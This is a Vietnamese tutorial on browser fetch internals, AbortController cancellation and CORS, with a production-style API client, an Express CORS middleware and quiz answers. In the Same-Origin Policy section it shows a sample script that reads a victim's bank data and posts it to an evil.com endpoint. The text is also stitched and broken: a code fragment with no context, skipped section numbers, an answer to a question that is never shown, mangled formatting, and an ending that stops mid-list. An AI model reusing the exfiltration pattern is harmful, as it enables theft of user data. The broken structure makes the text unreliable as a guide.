## 1. Cơ chế thật

### fetch — Không phải XMLHttpRequest mới, là stream pipeline

Trước khi đi vào API, cần hiểu `fetch` nằm ở đâu trong browser architecture và tại sao nó được thiết kế khác XMLHttpRequest.

```
XMLHttpRequest (2006):
  - Thiết kế cho request/response đơn giản
  - Response phải download XONG mới access được
  - Event-based API (onload, onerror, onprogress)
  - Tightly coupled với DOM (chỉ dùng được từ window context)

fetch (2015):
  - Thiết kế xung quanh Streams — response là ReadableStream
  - Có thể process response TRONG KHI đang download
  - Promise-based
  - Available trong Worker contexts (Service Worker, Web Worker)
  - Tách biệt Request/Response thành first-class objects
```

**Vị trí trong browser architecture:**

```
┌──────────────────────────────────────────────────────────┐
│                  Renderer Process                         │
│                                                           │
│  ┌─────────────────────────────────────────────────┐    │
│  │  Main Thread / Worker Thread                     │    │
│  │                                                   │    │
│  │  fetch('/api/data')                              │    │
│  │       │                                           │    │
│  │       ▼                                           │    │
│  │  Fetch Engine (Blink)                            │    │
│  │  - Resolve URL                                   │    │
│  │  - Check CORS policy                             │    │
│  │  - Build Request object                          │    │
│  │  - Create ReadableStream for response body       │    │
│  └───────────────────────┬───────────────────────── ┘    │
│                          │ IPC (Mojo)                     │
└──────────────────────────┼───────────────────────────────┘
                           │
┌──────────────────────────┼───────────────────────────────┐
│             Browser Process│                              │
│                           ▼                               │
│  ┌────────────────────────────────────────────────────┐  │
│  │  Network Service                                    │  │
│  │                                                     │  │
│  │  - DNS resolution                                   │  │
│  │  - TCP connection (connection pool)                 │  │
│  │  - TLS handshake                                    │  │
│  │  - HTTP/2 multiplexing                              │  │
│  │  - Cookie attachment (HttpOnly cookies)             │  │
│  │  - Cache-Control enforcement                        │  │
│  │  - CORS preflight (nếu cần)                        │  │
│  │                                                     │  │
│  │  Response body → stream data back to Renderer      │  │
│  └────────────────────────────────────────────────────┘  │
└───────────────────────────────────────────────────────────┘
```

**Điều quan trọng:** `fetch()` không chạy network I/O trong Renderer Process. Nó gửi IPC message sang **Network Service** (Browser Process). Network Service làm tất cả network operations, stream response data trở lại qua IPC. Đây là lý do:

1. Renderer Process bị compromise (XSS) vẫn không có raw socket access
2. Cookies được attach bởi Network Service, không phải JS code
3. CORS enforcement xảy ra ở hai nơi: Renderer (check response headers) và đôi khi Network Service

### fetch — Promise resolution model (thường hiểu sai)

Đây là nguồn gốc của một bug cực kỳ phổ biến:

```
fetch() Promise resolve khi nào?

KHÔNG PHẢI khi response body đã download xong.
LÀ khi response HEADERS đã nhận được.

Timeline:
──────────────────────────────────────────────────────────►
  fetch() called
       │
       ▼
  DNS + TCP + TLS + Send Request
       │
       ▼
  Server gửi Response Headers (200 OK, Content-Type, v.v.)
       │
       ▼
  ← fetch() Promise RESOLVES ĐÂY ←
  response.status, response.headers available
       │
       ▼
  Server tiếp tục stream response body
       │
       ▼
  response.json() / response.text() / response.arrayBuffer()
  → Đây là Promise thứ hai, resolve khi body đã download XONG
```

Tại sao thiết kế như vậy? Vì response body là **ReadableStream**. Headers cho biết body sẽ có dạng gì và browser có thể bắt đầu setup stream pipeline. Bạn có thể quyết định không đọc body (chỉ cần check status), hoặc stream body theo chunks mà không cần đợi toàn bộ.

### fetch — Request object internals

Khi bạn gọi `fetch(url, options)`, Blink tạo một `Request` object. Hiểu các options này ở tầng cơ chế:

**`mode`** — kiểm soát CORS behavior:

```
mode: 'cors' (default cho cross-origin):
  - Browser gửi Origin header
  - Nếu cần: gửi preflight OPTIONS request
  - Server phải trả Access-Control-Allow-Origin header
  - Nếu thiếu/sai → TypeError (network error từ JS perspective)

mode: 'no-cors':
  - Browser gửi request nhưng JS KHÔNG được đọc response
  - response.type === 'opaque' — body, status, headers đều ẩn
  - Chỉ dùng được cho side-effect requests (beacon, ping)
  - Tại sao có? Cho phép gửi request cross-origin mà không trigger preflight
  - Use case: analytics pixel, service worker background sync

mode: 'same-origin':
  - Chỉ cho phép same-origin requests
  - Cross-origin request → TypeError ngay, không gửi network request
```

**`credentials`** — kiểm soát cookie & auth header:

```
credentials: 'same-origin' (default):
  - Gửi cookies chỉ khi same-origin
  - Cross-origin: không gửi cookies

credentials: 'include':
  - Gửi cookies kể cả cross-origin
  - YÊU CẦU server set Access-Control-Allow-Credentials: true
  - YÊU CẦU Access-Control-Allow-Origin KHÔNG ĐƯỢC là '*'
    (phải specify exact origin)

credentials: 'omit':
  - Không gửi cookies trong mọi trường hợp
  - Dùng cho public API calls không cần auth
```

**`cache`** — tương tác với HTTP cache:

```
cache: 'default':
  Tuân theo HTTP cache headers bình thường
  Fresh cache → dùng cache
  Stale → revalidate với server (conditional request)

cache: 'no-store':
  Không đọc cache, không ghi vào cache
  Luôn gửi fresh request
  Server không nhận If-None-Match hay If-Modified-Since

cache: 'no-cache':
  TÊN GÂY HIỂU LẦM — vẫn CÓ dùng cache
  Luôn gửi revalidation request (If-None-Match, If-Modified-Since)
  Nếu server trả 304 → dùng cached version
  Khác no-store: response ĐƯỢC GHI vào cache

cache: 'force-cache':
  Dùng cache dù stale
  Chỉ fetch từ network nếu không có cache entry

cache: 'reload':
  Bỏ qua cache khi đọc (luôn fetch fresh)
  Nhưng VẪN GHI response vào cache
```

**`keepalive`** — gửi request sau khi page unload:

```
keepalive: true:
  Request tiếp tục dù page bị navigate away hoặc đóng
  Limit: 64KB total body size

  Use case: analytics, logging khi user rời trang
  Thay thế cho sendBeacon() với nhiều control hơn

  Cơ chế: Network Service giữ request alive dù Renderer Process bị destroy
```

### fetch — Response consumption model

Response body là `ReadableStream` — **chỉ đọc được một lần**. Đây là nguồn của nhiều bugs:

```javascript
const response = await fetch('/api/data');

// ❌ Bug: cố đọc body hai lần
const text = await response.text();
const json = await response.json(); // TypeError: body already used

// ✅ Clone nếu cần đọc nhiều lần
const response = await fetch('/api/data');
const clone = response.clone(); // Clone trước khi đọc

const text = await response.text();
const json = await clone.json(); // OK — đọc từ clone
```

**Tại sao body chỉ đọc được một lần?** Vì nó là stream từ Network Service qua IPC. Một khi data được consume, IPC buffer được release. Không có "rewind". `clone()` tạo một fork của stream — cả hai stream nhận cùng data từ Network Service, mỗi cái có buffer riêng.

### AbortController — Cancellation propagation

`AbortController` là implementation của **Cancellation Token pattern** trong Web APIs. Cơ chế:

```
AbortController (JS side):
├── signal: AbortSignal (read-only, có thể pass đi)
└── abort(reason): kích hoạt cancellation

AbortSignal:
├── aborted: boolean
├── reason: any (error object)
└── addEventListener('abort', handler): listen for cancellation
```

**Cơ chế propagation khi `abort()` được gọi:**

```
controller.abort()
    │
    ▼
AbortSignal.aborted = true
AbortSignal.reason = DOMException('AbortError')
    │
    ▼
Tất cả 'abort' event listeners trên signal được fire
    │
    ├──► fetch() đang pending với signal này:
    │    - Blink nhận abort event
    │    - Gửi IPC cancellation message đến Network Service
    │    - Network Service cancel TCP connection (hoặc close stream)
    │    - fetch() Promise reject với AbortError
    │
    └──► Bất kỳ consumer nào khác đang listen signal
         (có thể là custom code, setTimeout cleanup, v.v.)
```

**Điều quan trọng:** Khi request đã gửi đi và server đang xử lý, `abort()` close connection từ phía client. Server **không nhận được thông báo** (TCP RST packet). Server có thể tiếp tục xử lý request đó một lúc trước khi phát hiện connection đóng. Đây là lý do abort không đảm bảo server side effect không xảy ra.

### CORS — Tại sao tồn tại và cơ chế thật

CORS (Cross-Origin Resource Sharing) là thứ gây confuse nhất cho frontend developers. Gốc rễ của nó nằm ở một security model rất cũ: **Same-Origin Policy (SOP)**.

**Same-Origin Policy — Tại sao cần:**

```
Scenario không có SOP (1995):
  User đang login vào bank.com (có session cookie)
  User mở tab mới, vào evil.com

  evil.com có JavaScript:
  fetch('https://bank.com/api/balance')
    .then(r => r.json())
    .then(data => {
      // Gửi balance của user về evil.com server!
      fetch('https://evil.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
      });
    });

  Browser gửi request đến bank.com VỚI SESSION COOKIE của user
  Bank.com thấy valid session → trả về balance
  evil.com steal được sensitive data
```

SOP ngăn điều này: **script từ origin A không thể đọc response từ origin B**.

**Tại sao CORS tồn tại:**

SOP quá strict. Có những legitimate cross-origin requests:

- Frontend app trên `app.company.com` cần gọi API trên `api.company.com`
- CDN hoặc microservices architecture
- Third-party services (Stripe, Auth0, v.v.)

CORS là mechanism để **server opt-in** cho phép specific origins đọc response của mình.

**CORS enforcement — Ai check gì:**

```
Điểm quan trọng: CORS là browser-enforced, không phải server-enforced.

Server luôn nhận request và xử lý bình thường.
Server luôn gửi response về.
BROWSER quyết định có cho JS đọc response đó không.

┌──────────────────────────────────────────────────────────┐
│  evil.com script gọi fetch('https://bank.com/balance')   │
│                                                           │
│  Step 1: Browser check — có cần preflight không?         │
│          Nếu cần: gửi OPTIONS request trước              │
│                                                           │
│  Step 2: Browser gửi actual request                      │
│          (với Origin: https://evil.com header)           │
│                                                           │
│  Step 3: Server xử lý, trả response                     │
│          (bank.com luôn trả response dù là evil.com gọi)│
│                                                           │
│  Step 4: Browser nhận response headers, kiểm tra:       │
│          Access-Control-Allow-Origin có chứa             │
│          https://evil.com không?                         │
│          → Không → Browser BLOCK JS đọc response        │
│          → JS nhận TypeError: Failed to fetch           │
│                                                           │
│  Data vẫn được truyền từ server về browser!             │
│  Nhưng JS không được phép đọc nó.                       │
└──────────────────────────────────────────────────────────┘
```

**Đây là lý do CORS không thể bị bypass từ browser.** Curl, Postman, server-to-server calls không có CORS vì không có browser enforcement. Chỉ browser JS bị restrict.

### CORS — Simple requests vs Preflighted requests

Browser phân loại requests thành hai loại để quyết định có cần preflight không:

**Simple Request (không cần preflight):**

```
Conditions (TẤT CẢ phải đúng):
1. Method: GET, POST, hoặc HEAD
2. Headers chỉ gồm:
   - Accept
   - Accept-Language
   - Content-Language
   - Content-Type CHỈ với: application/x-www-form-urlencoded,
                           multipart/form-data,
                           text/plain
3. Không có ReadableStream trong body
4. Không có event listeners trên XMLHttpRequestUpload

Tại sao simple request tồn tại?
  HTML forms (<form method="POST">) đã có thể gửi cross-origin requests
  từ trước khi JS và fetch tồn tại.
  CORS simple request category map với những gì forms có thể làm.
  → Không thể "break the web" bằng cách require preflight cho chúng.
```

**Preflighted Request:**

```
Mọi request KHÔNG phải simple request đều bị preflight.
Ví dụ triggers:
  - Method: PUT, DELETE, PATCH
  - Content-Type: application/json  ← rất phổ biến, gây preflight!
  - Custom headers: Authorization, X-Custom-Header, v.v.

Flow:
  1. Browser gửi OPTIONS request trước:
     OPTIONS /api/data HTTP/1.1
     Origin: https://app.example.com
     Access-Control-Request-Method: POST
     Access-Control-Request-Headers: Content-Type, Authorization

  2. Server trả lời preflight:
     HTTP/1.1 204 No Content
     Access-Control-Allow-Origin: https://app.example.com
     Access-Control-Allow-Methods: GET, POST, PUT, DELETE
     Access-Control-Allow-Headers: Content-Type, Authorization
     Access-Control-Max-Age: 86400   ← Cache preflight 24 hours!

  3. Browser check response:
     - Origin cho phép? ✅
     - Method cho phép? ✅
     - Headers cho phép? ✅

  4. Browser gửi actual request

  5. Server xử lý, response phải LẠI CÓ CORS headers!
     Access-Control-Allow-Origin: https://app.example.com
     (Không chỉ preflight response mới cần, actual response cũng cần)
```

**`Access-Control-Max-Age` — Preflight cache:**

```
Browser cache preflight result theo (origin, method, headers) key.
Max-Age=86400 → 24 giờ không cần OPTIONS request nữa.

Tại sao quan trọng về performance?
  Mỗi API call cần JSON body = 1 preflight + 1 actual = 2 requests
  Với Max-Age: chỉ 1 preflight đầu tiên, sau đó chỉ 1 actual request mỗi lần

  App với 50 API calls:
  - Không có Max-Age: 100 requests (50 preflight + 50 actual)
  - Có Max-Age=86400: 51 requests ngày đầu, 50 requests các ngày sau
```

### CORS — `credentials` và `wildcard` incompatibility

Đây là gotcha cực kỳ phổ biến:

```
Vấn đề: Cần gửi cookies trong cross-origin request

Client:
  fetch('https://api.example.com/user', {
    credentials: 'include'
  });

Server (SAI):
  Access-Control-Allow-Origin: *
  Access-Control-Allow-Credentials: true
  → Browser REJECT! TypeError.

  Tại sao? Với credentials, '*' là quá nguy hiểm.
  Nếu cho phép BẤT KỲ origin nào gửi credentials,
  evil.com có thể gửi cookies của user đến api.example.com
  và đọc response → Hoàn toàn phá vỡ mục đích của SOP.

Server (ĐÚNG):
  Access-Control-Allow-Origin: https://app.example.com  ← Exact origin, không phải *
  Access-Control-Allow-Credentials: true
  Vary: Origin  ← QUAN TRỌNG: báo cache đây là per-origin response
```

**`Vary: Origin` — Tại sao cần thiết:**

```
Không có Vary: Origin:
  CDN cache response với Access-Control-Allow-Origin: https://app.example.com
  Request từ https://other.example.com đến
  CDN serve cached response với wrong ACAO header
  → CORS fail cho other.example.com dù server có thể allow nó

Có Vary: Origin:
  CDN biết response này khác nhau theo Origin header
  Cache theo (URL, Origin) key thay vì chỉ URL
  → Mỗi origin nhận đúng response cho mình
```

### CORS preflight cache

```
Request 1 (t=0): POST /api với Content-Type: application/json
──────────────────────────────────────────────────────────────
  OPTIONS /api → Server → 204 + CORS headers
  POST /api → Server → 200 + data

  Browser cache: { origin, method, headers } → expires t+3600s

Request 2 (t=5s): POST /api (cùng params)
──────────────────────────────────────────
  Cache hit! Không cần OPTIONS
  POST /api → Server → 200 + data  ✅ Tiết kiệm 1 round-trip

Request 3 (t=3601s): POST /api
──────────────────────────────
  Cache expired!
  OPTIONS /api → Server → 204 + CORS headers
  POST /api → Server → 200 + data

Request 4 (t=3605s): DELETE /api (khác method)
───────────────────────────────────────────────
  Cache miss! (method khác = cache key khác)
  OPTIONS /api → Server (với ACRM: DELETE)
  DELETE /api → Server → 200
```

### fetch — Production-grade wrapper

```javascript
// Một fetch wrapper thực tế dùng trong production
// Xử lý: timeout, retry, error types, base URL, auth header injection

class ApiClient {
  #baseUrl;
  #defaultHeaders;
  #timeout;
  #retryConfig;

  constructor({ baseUrl, timeout = 10000, retryConfig = {} }) {
    this.#baseUrl = baseUrl;
    this.#timeout = timeout;
    this.#retryConfig = {
      maxRetries: 3,
      retryableStatuses: [408, 429, 500, 502, 503, 504],
      backoffMs: 1000,
      ...retryConfig,
    };
    this.#defaultHeaders = {
      'Content-Type': 'application/json',
    };
  }

  // Inject auth token tại request time, không phải constructor time
  // Tại sao? Token có thể thay đổi (refresh). Closure over mutable ref.
  async #getAuthHeader() {
    const token = await tokenStore.getValidToken(); // Tự refresh nếu expired
    return token ? { Authorization: `Bearer ${token}` } : {};
  }

  async request(path, options = {}) {
    const url = `${this.#baseUrl}${path}`;
    const authHeader = await this.#getAuthHeader();

    // Tạo một AbortController cho timeout
    // Tách biệt với optional signal từ caller
    const timeoutController = new AbortController();
    const timeoutId = setTimeout(
      () =>
        timeoutController.abort(
          new Error(`Request timeout after ${this.#timeout}ms`),
        ),
      this.#timeout,
    );

    // Nếu caller truyền signal, cần combine cả hai
    // Cả timeout VÀ caller cancel đều có thể abort request
    const { signal: callerSignal, ...restOptions } = options;

    // AbortSignal.any() — ES2023, combine nhiều signals
    // Abort khi BẤT KỲ signal nào abort
    const combinedSignal = callerSignal
      ? AbortSignal.any([timeoutController.signal, callerSignal])
      : timeoutController.signal;

    const requestOptions = {
      ...restOptions,
      headers: {
        ...this.#defaultHeaders,
        ...authHeader,
        ...options.headers,
      },
      signal: combinedSignal,
      credentials: 'include', // Gửi cookies cho same-origin và cross-origin (nếu server allow)
    };

    // Serialize body nếu là object
    // fetch() không tự JSON.stringify
    if (requestOptions.body && typeof requestOptions.body === 'object') {
      requestOptions.body = JSON.stringify(requestOptions.body);
    }

    let lastError;

    for (let attempt = 0; attempt <= this.#retryConfig.maxRetries; attempt++) {
      try {
        if (attempt > 0) {
          // Exponential backoff với jitter
          // Jitter: randomize để tránh thundering herd
          // (nhiều clients retry cùng lúc overwhelm server)
          const backoff = this.#retryConfig.backoffMs * 2 ** (attempt - 1);
          const jitter = Math.random() * backoff * 0.1;
          await sleep(backoff + jitter);
        }

        const response = await fetch(url, requestOptions);

        // Xóa timeout timer khi response headers nhận được
        // (nhưng body có thể chưa download xong)
        clearTimeout(timeoutId);

        // response.ok: true khi status 200-299
        if (!response.ok) {
          const error = await this.#parseError(response);

          // Chỉ retry với specific status codes
          if (
            attempt < this.#retryConfig.maxRetries &&
            this.#retryConfig.retryableStatuses.includes(response.status)
          ) {
            lastError = error;
            continue; // Thử lại
          }

          throw error;
        }

        return await this.#parseResponse(response);
      } catch (error) {
        clearTimeout(timeoutId);

        // AbortError có thể là timeout hoặc user cancel
        if (error.name === 'AbortError') {
          // Check xem là timeout hay user cancel để có error message đúng
          if (timeoutController.signal.aborted) {
            throw new ApiError('Request timed out', 408, null);
          }
          throw error; // Re-throw user cancellation
        }

        // Network errors (DNS fail, connection refused, v.v.)
        if (error instanceof TypeError && error.message === 'Failed to fetch') {
          throw new ApiError('Network error — check your connection', 0, null);
        }

        // Không retry nếu đây không phải network error
        if (
          !(error instanceof ApiError) ||
          !this.#retryConfig.retryableStatuses.includes(error.status)
        ) {
          throw error;
        }

        lastError = error;
      }
    }

    throw lastError;
  }

  async #parseResponse(response) {
    const contentType = response.headers.get('Content-Type') || '';

    if (contentType.includes('application/json')) {
      return response.json();
    }
    if (contentType.includes('text/')) {
      return response.text();
    }
    // Binary response (PDF, image, v.v.)
    return response.blob();
  }

  async #parseError(response) {
    let body = null;
    try {
      const contentType = response.headers.get('Content-Type') || '';
      if (contentType.includes('application/json')) {
        body = await response.json();
      }
    } catch {
      /* ignore */
    }

    return new ApiError(
      body?.message || response.statusText,
      response.status,
      body,
    );
  }

  // Convenience methods
  get(path, options) {
    return this.request(path, { ...options, method: 'GET' });
  }
  post(path, body, options) {
    return this.request(path, { ...options, method: 'POST', body });
  }
  put(path, body, options) {
    return this.request(path, { ...options, method: 'PUT', body });
  }
  delete(path, options) {
    return this.request(path, { ...options, method: 'DELETE' });
  }
}

class ApiError extends Error {
  constructor(message, status, body) {
    super(message);
    this.name = 'ApiError';
    this.status = status;
    this.body = body;
  }
}

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
```

```javascript
// Express CORS middleware — implement đúng cơ chế
function corsMiddleware(allowedOrigins) {
  return (req, res, next) => {
    const origin = req.headers['origin'];

    // Không có Origin header = same-origin request hoặc non-browser
    // (curl, server-to-server, v.v.) — không cần CORS headers
    if (!origin) {
      return next();
    }

    const isAllowed = allowedOrigins.includes(origin);

    if (!isAllowed) {
      // Không set CORS headers → browser block JS đọc response
      // Request vẫn được xử lý (server vẫn nhận được)
      // Nhưng browser sẽ throw CORS error sau khi nhận response

      // Tùy chọn: reject sớm để tránh xử lý unnecessary
      return res.status(403).json({ error: 'Origin not allowed' });
    }

    // Set CORS headers trên mọi response (không chỉ preflight)
    res.setHeader('Access-Control-Allow-Origin', origin);
    // Không dùng '*' khi có credentials

    res.setHeader('Access-Control-Allow-Credentials', 'true');

    // Vary: Origin — BẮT BUỘC khi ACAO không phải '*'
    // Báo CDN/proxy cache response theo origin
    res.setHeader('Vary', 'Origin');

    // Expose thêm headers cho JS đọc
    // Mặc định JS chỉ đọc được: Cache-Control, Content-Language,
    // Content-Length, Content-Type, Expires, Last-Modified, Pragma
    res.setHeader(
      'Access-Control-Expose-Headers',
      'X-Total-Count, X-Request-Id, X-RateLimit-Remaining',
    );

    // Handle preflight request
    if (req.method === 'OPTIONS') {
      res.setHeader(
        'Access-Control-Allow-Methods',
        'GET, POST, PUT, PATCH, DELETE, OPTIONS',
      );
      res.setHeader(
        'Access-Control-Allow-Headers',
        'Authorization, Content-Type, X-Request-Id',
      );
      // Cache preflight 2 hours — giảm OPTIONS requests đáng kể
      // Browser Chrome: max 2 hours (7200s), Firefox: max 24 hours
      res.setHeader('Access-Control-Max-Age', '7200');

      // 204 No Content cho preflight
      return res.status(204).end();
    }

    next();
  };
}

      'https://staging.example.com',
      process.env.NODE_ENV === 'development' ? 'http://localhost:3000' : null,
    ].filter(Boolean),
  ),
);
```

## 5. Câu hỏi kiểm tra

**Q1: Tại sao `fetch()` Promise resolve ngay khi nhận được response headers mà không đợi body download xong? Điều này tạo ra vấn đề gì?**

A: Vì response body được implement như một `ReadableStream`. Khi headers đến, browser đã biết đủ thông tin để bắt đầu xử lý (status code, content type, content length). Việc expose Response object ngay lúc này cho phép developer quyết định có nên đọc body không, và đọc theo cách nào (streaming chunk-by-chunk hay buffer toàn bộ). Nếu Promise đợi full body, streaming không thể implement được.

Vấn đề phổ biến: Developer assume khi `.then(r => r.json())` được gọi, data đã sẵn sàng. Thực ra, `r.json()` là **Promise thứ hai** — nó bắt đầu đọc stream và buffer toàn bộ body trước khi parse JSON. Nếu connection drop sau khi headers gửi xong nhưng trước khi body complete, `r.json()` sẽ throw. Error này xuất hiện trong `.then()` thứ hai, không phải `.then()` đầu tiên — gây confuse khi debug.

---

**Q2: Điều gì xảy ra ở tầng network khi `controller.abort()` được gọi khi fetch request đang chờ response?**

A: Chuỗi sự kiện:

1. `controller.abort()` set `signal.aborted = true` và fire `abort` event trên signal
2. Blink fetch engine (trong Renderer Process) nhận abort event, gửi IPC cancellation message đến Network Service (Browser Process)
3. Network Service tìm pending request tương ứng và **close TCP connection** (gửi TCP RST packet)
4. IPC response trả về Renderer Process: request cancelled
5. fetch() Promise reject với `DOMException: AbortError`

Về phía server: server nhận TCP RST và connection đóng đột ngột. Nếu server đang giữa process request, server phát hiện connection closed khi cố ghi response. Tùy implementation, server có thể throw `ECONNRESET` error. **Server không nhận được structured cancellation** — chỉ là connection closed. Đây là lý do với các operations có side effects (POST tạo order), abort không đảm bảo operation bị rollback.

---

**Q3: Đoạn code này có vấn đề gì?**

```javascript
// server.js
app.get('/api/data', (req, res) => {
  if (!req.headers['x-api-key']) {
    return res.status(401).json({ error: 'Missing API key' });
  }
  res.json({ data: 'secret' });
});

// client.js (chạy trên https://app.example.com)
fetch('https://api.example.com/api/data', {
  headers: { 'X-API-Key': 'key123' },
}).catch((err) => console.log(err.message));
// Log: "Failed to fetch" — không phải "Missing API key"
```

A: Có hai vấn đề liên quan:

**Vấn đề 1 — Thiếu CORS headers hoàn toàn:** Server không set bất kỳ CORS headers nào. Browser nhận response (401 hoặc 200) nhưng không thấy `Access-Control-Allow-Origin` → block JS đọc response → fetch reject với `TypeError: Failed to fetch`. JS không thể biết status code là 401 hay nội dung error message.

**Vấn đề 2 — Custom header trigger preflight:** `X-API-Key` là custom header → request cần preflight. Browser gửi `OPTIONS` request trước. Server không handle `OPTIONS` method → Express trả 404 cho preflight → preflight fail → actual request không bao giờ được gửi → JS thấy CORS error.

Fix: Thêm CORS middleware đặt trước route handlers, đảm bảo `X-API-Key` được include trong `Access-Control-Allow-Headers`. CORS headers phải có trên mọi response kể cả 401.

---

**Q4: Tại sao `Access-Control-Allow-Origin: *` không thể dùng cùng với `credentials: 'include'`, và tại sao thiết kế này là đúng về mặt security?**

A: Thiết kế này là intentional security constraint.

`credentials: 'include'` nghĩa là browser sẽ gửi cookies của user đến cross-origin server. Cookies có thể chứa session tokens, auth cookies — thứ identify user.

Nếu server trả `Access-Control-Allow-Origin: *` (mọi origin được phép đọc response) và `Access-Control-Allow-Credentials: true`:

```
evil.com gọi fetch('https://bank.com/api/balance', { credentials: 'include' })
→ Browser gửi user's cookies đến bank.com
→ bank.com xử lý, trả về balance (vì valid session)
→ Server: ACAO: * → evil.com được phép đọc response
→ evil.com đọc được balance của victim
→ Same-Origin Policy hoàn toàn bị bypass
```

Bằng cách yêu cầu exact origin (không phải wildcard) khi `Allow-Credentials: true`, browser đảm bảo chỉ server đã explicitly trust specific origin đó mới cho phép credentials flow. `*` là "trust everyone" — không compatible với "gửi sensitive credentials".

---

**Q5: Tại sao `Vary: Origin` quan trọng khi implement CORS với dynamic `Access-Control-Allow-Origin`?**

A: `Vary` header báo cho caching layers (CDN, proxy, browser HTTP cache) rằng **response khác nhau dựa trên giá trị của specified request header**.

Scenario không có `Vary: Origin`:

```
Request 1: Origin: https://app.example.com
Server response:
  Access-Control-Allow-Origin: https://app.example.com
  Vary: (not set)
  Body: { data: ... }

→ CDN cache response này với key = URL

Request 2: Origin: https://other-app.example.com  (cùng URL, khác origin)
→ CDN serve cached response!
→ Cached response: ACAO: https://app.example.com
→ Browser của other-app.example.com thấy ACAO không match origin
→ CORS error! Dù server có thể muốn allow other-app.example.com
```

Với `Vary: Origin`:

```
CDN cache key = URL + Origin header value
Request từ app.example.com → cache entry A (ACAO: https://app.example.com)
Request từ other.example.com → cache miss → fetch từ origin → cache entry B
```

Hệ quả security khi thiếu `Vary: Origin`: CDN có thể cache response với `ACAO: https://trusted.com` rồi serve cho request từ `https://evil.com` với wrong ACAO. Browser thấy ACAO: trusted.com trong khi origin là evil.com → CORS block → evil.com không đọc được. Ở đây security vẫn hold, nhưng **caching không hoạt động đúng** và có thể gây unexpected CORS failures.

**Đáp án:**

**Lý do lịch sử và backward compatibility:**

CORS spec định nghĩa "simple request" để map với những gì HTML forms có thể làm trước khi JavaScript tồn tại. `<form>` elements có thể gửi cross-origin POST requests với `Content-Type` là `application/x-www-form-urlencoded`, `multipart/form-data`, hoặc `text/plain`. Do đó, nếu require preflight cho những request types này, nó sẽ break vô số trang web hiện có (backward compatibility).

`application/json` không phải là thứ HTML forms có thể tạo ra natively — nó chỉ có thể gửi bởi JavaScript. Do đó, browser require preflight cho JSON requests vì đây là behavior mới mà server có thể chưa được thiết kế để handle từ cross-origin contexts.

**Impact lên performance:**

Mỗi API call với JSON body = 2 HTTP requests (OPTIONS + actual request). Không có preflight caching:

```
App gọi 10 endpoints trong lần load đầu:
- 10 OPTIONS requests (preflight)
- 10 actual requests
- Total: 20 HTTP round-trips
```

Với `Access-Control-Max-Age: 7200` (2 giờ):

```
Session đầu tiên: 10 + 10 = 20 requests
Trong 2 giờ tiếp theo: 0 + 10 = 10 requests (50% tiết kiệm)
```

**Các chiến lược giảm preflight overhead:**

1. **Set `Access-Control-Max-Age`** cao nhất có thể (Chrome: 7200s, Firefox: 86400s)
2. **HTTP/2**: Preflight và actual request có thể multiplexed trên cùng connection, giảm latency overhead
3. **API gateway pattern**: Đặt frontend và API trên cùng origin (reverse proxy), loại bỏ CORS hoàn toàn
4. **Avoid unnecessary custom headers**: Mỗi custom header phải được list trong `Access-Control-Allow-Headers`, và nếu header trigger preflight, nó adds overhead

### Câu 2: Mô tả đầy đủ flow khi `fetch()` với `credentials: 'include'` được gọi đến một cross-origin API, bao gồm cả những gì xảy ra nếu server config sai.

**Đáp án:**

**Happy path (server config đúng):**

1. JS gọi `fetch('https://api.example.com/user', { credentials: 'include', method: 'GET' })`
2. Blink check: cross-origin? Có. Method GET, no custom headers → simple request.
3. Blink set `credentials` mode = include trên Request object.
4. IPC → Network Service: gửi request với Origin header.
5. Network Service check Cookie Jar: có cookies cho `api.example.com` không? Nếu có (kể cả HttpOnly cookies), đính kèm vào `Cookie` header.
6. Request đến server với `Cookie: sessionId=abc; Origin: https://app.example.com`.
7. Server check Origin, trả response với:
   - `Access-Control-Allow-Origin: https://app.example.com` (exact origin, không phải \*)
   - `Access-Control-Allow-Credentials: true`
   - `Vary: Origin`
   - Nếu response set cookie: `Set-Cookie: newToken=xyz; SameSite=None; Secure` (cần `SameSite=None` cho cross-origin cookies)
8. IPC → Renderer Process: response headers nhận được.
9. Blink check CORS: ACAO match origin? Có. ACAC = true? Có. → Allow.
10. fetch() Promise resolve với Response object. JS đọc được response body.

**Failure scenarios:**

_Server dùng `ACAO: _`với`ACAC: true`:*
Blink check: `credentials: include`+`ACAO: \*` → incompatible. Bất kể ACAC có true hay không. fetch() reject với CORS error. JS không đọc được response.

_Server set `ACAO: https://app.example.com` nhưng quên `ACAC: true`:_
Blink check: `credentials: include` nhưng không thấy `Access-Control-Allow-Credentials: true` → CORS error. JS không đọc được response mặc dù ACAO correct.

_Server thiếu `Vary: Origin`:_
CDN cache response với `ACAO: https://app.example.com`. Request từ origin khác nhận cached response với wrong ACAO → CORS error (mặc dù server muốn allow origin đó). Tệ hơn: CDN có thể cache response thiếu CORS headers cho request không có Origin header, rồi serve cho cross-origin request → toàn bộ CORS fail cho users sau.

_Cross-origin cookies cần `SameSite=None; Secure`:_
Từ Chrome 80, cookies không có SameSite attribute bị default là `Lax`. `Lax` cookies không được gửi trong cross-origin fetch, kể cả với `credentials: include`. Server phải explicitly set `SameSite=None; Secure` cho cookies intended to be sent cross-origin.

### Câu 3: Giải thích tại sao CORS không phải là security mechanism ở server-side, và tại sao server-to-server calls không bị CORS.

**Đáp án:**

**CORS là browser-enforced, server chỉ cung cấp policy:**

CORS enforcement xảy ra hoàn toàn trong browser. Flow thực tế:

1. Browser gửi request (với Origin header)
2. **Server nhận request, xử lý bình thường, gửi response** — server không "block" gì cả
3. Browser nhận response, kiểm tra CORS headers
4. Nếu CORS check fail: Browser block JS đọc response — nhưng request đã xảy ra rồi

Điều này có nghĩa:

- State-changing GET requests (anti-pattern nhưng tồn tại) đã được executed dù CORS fail
- POST requests không có CORS headers? Request đã đến server, server đã process
- "CORS error" trong console = browser block JS đọc response, không phải browser block request gửi đi

**Tại sao server-to-server không có CORS:**

CORS chỉ áp dụng khi request xuất phát từ **browser running JavaScript** trong một browsing context với Same-Origin Policy. Điều này vì mục tiêu của CORS là bảo vệ user credentials:

```
Browser context: User đang login vào bank.com, có session cookies
  evil.com script muốn đọc bank.com data WITH USER'S COOKIES
  → Đây là attack vector CORS ngăn chặn

Server-to-server context: Server A gọi Server B
  Server A không có "user's cookies" — không có browsing context, không có user session
  Không có credentials nào để steal
  → Không cần CORS protection
```

`curl`, Postman, Python `requests`, Node.js `fetch` — tất cả đều bypass CORS vì không có browser enforcement layer.

**Hệ quả cho security architecture:**

CORS không thể thay thế server-side auth. Một API chỉ dựa vào CORS để "bảo vệ" là hoàn toàn không an toàn:

- Bất kỳ server có thể call API không bị CORS (chỉ browsers bị)
